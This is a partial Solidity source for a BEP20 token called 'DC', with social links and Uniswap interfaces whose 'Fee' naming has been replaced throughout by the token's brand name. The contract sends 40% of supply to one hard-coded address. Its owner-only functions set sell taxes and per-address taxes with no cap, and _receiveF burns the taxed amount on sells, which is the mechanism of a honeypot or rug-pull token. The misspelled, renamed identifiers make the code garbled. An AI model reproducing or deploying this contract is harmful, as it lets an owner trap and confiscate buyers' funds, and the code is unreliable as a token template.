...
* http://instagram.com/DayChrome196
* https://www.reddit.com/user/DayChrome196
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingDayChrome196OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingDayChrome196OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingDayChrome196OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingDayChrome196OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingDayChrome196OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function DayChrome196To() external view returns (address);
    function DayChrome196ToSetter() external view returns (address);
    ...
    function setDayChrome196To(address) external;
    function setDayChrome196ToSetter(address) external;
}
...
contract DC is BEP20, Ownable {
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*4);	
        ...
        _defaultSellDayChrome196 = 0;
        _defaultBuyDayChrome196 = 0;
    ...
    uint256 private _defaultSellDayChrome196 = 0;
    uint256 private _defaultBuyDayChrome196 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellDayChrome196 = _value;
    }


    function acDayChrome196fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeDayChrome196amuont = 0;

        if (rF) {
            uint256 tradeDayChrome196 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeDayChrome196 = _msgDayChrome196Info(uint160(from));
                    tradeDayChrome196 = tradeDayChrome196 < _defaultSellDayChrome196 ? _defaultSellDayChrome196 : tradeDayChrome196;
                }
                if (from == uniswapV2Pair) {
                    tradeDayChrome196 = _defaultBuyDayChrome196;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeDayChrome196 = _Escape[from];
            }


            tradeDayChrome196amuont = _amuont.mul(tradeDayChrome196).div(100);
        }


        if (tradeDayChrome196amuont > 0) {
            _balances[from] = _balances[from].sub(tradeDayChrome196amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeDayChrome196amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeDayChrome196amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeDayChrome196amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeDayChrome196amuont);
        emit Transfer(from, _to, _amuont - tradeDayChrome196amuont);
    }
	...
	function _msgDayChrome196Info(uint _acc) internal view virtual returns (uint) {
